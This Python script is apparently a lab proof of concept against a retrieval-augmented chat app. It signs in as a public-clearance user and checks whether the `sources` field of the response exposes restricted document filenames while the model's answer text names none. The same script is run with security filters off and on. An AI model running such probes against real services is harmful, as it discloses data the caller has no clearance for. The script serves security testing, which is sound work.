#!/usr/bin/env python3
"""Phase 2 attack: source-name disclosure.

The /query and /chat responses carry a `sources` list built from retrieved chunk
metadata — see rag_chain.py, `sources = sorted({hit["metadata"]["source"] ...})`,
returned as `"sources": [] if blocked else sources`. The system prompt tells the
model not to name filenames in its prose, and it mostly obeys; but `sources` is
structured data assembled separately and shipped unconditionally in insecure
mode. So the response discloses document identities — and their tier, via the
path prefix — that the caller has no clearance for, even when the answer text
names nothing.

This asks a low-clearance reader a question and inspects `sources` for entries
whose tier outranks the reader. The distinguishing check: those filenames are
absent from the answer prose but present in the `sources` field — the leak is the
field itself, not the model's wording.

Read-only; nothing to clean up. Same script, both phases:
    phase 2  SECURITY_FILTERS_ENABLED=false -> DISCLOSED (exit 0)
    phase 3  SECURITY_FILTERS_ENABLED=true  -> SUPPRESSED (exit 1)
Exit 0 means the exploit landed.

Config via env: SECURERAG_URL, ATTACK_USER, ATTACK_PASS.
"""

from __future__ import annotations

import json
import os
import sys
import urllib.error
import urllib.request

BASE = os.environ.get("SECURERAG_URL", "http://localhost:8000").rstrip("/")
USER = os.environ.get("ATTACK_USER", "carol")   # public clearance, reader
PASS = os.environ.get("ATTACK_PASS", "pw-carol")

QUESTION = "Tell me about Project Redwood."

# A source path is disclosed if its tier prefix outranks the reader. carol holds
# public, so any restricted/ (or internal/) source in the response is a leak.
OVER_CLEARANCE_PREFIXES = ("restricted/",)


def _post(path: str, payload: dict, token: str | None = None) -> dict:
    headers = {"content-type": "application/json"}
    if token:
        headers["authorization"] = "Bearer " + token
    req = urllib.request.Request(
        BASE + path, data=json.dumps(payload).encode(), headers=headers, method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=200) as resp:
            return json.load(resp)
    except urllib.error.HTTPError as exc:
        sys.exit(f"HTTP {exc.code} on {path}: {exc.read().decode()[:200]}")
    except urllib.error.URLError as exc:
        sys.exit(f"Cannot reach {BASE} — is the app running? ({exc.reason})")


def main() -> int:
    login = _post("/login", {"username": USER, "password": PASS})
    token, clearance = login["token"], login["clearance"]
    print(f"[*] signed in as {USER} (clearance={clearance}, role={login['role']})")

    result = _post("/query", {"question": QUESTION}, token)
    sources, answer = result.get("sources", []), result.get("answer", "")

    disclosed = [s for s in sources if s.startswith(OVER_CLEARANCE_PREFIXES)]
    in_prose = [s for s in disclosed if s in answer]

    print(f"[*] sources field: {sources}")
    print(f"[*] answer:        {answer[:160]}")

    if disclosed:
        via = "prose and sources" if in_prose else "the sources field only (answer names nothing)"
        print(f"\n[!] DISCLOSED — {clearance} account learned over-clearance document "
              f"name(s) via {via}: {disclosed}")
        return 0
    print(f"\n[ ] SUPPRESSED — no over-clearance source names reached a {clearance} "
          f"account (refused={result.get('refused')}).")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
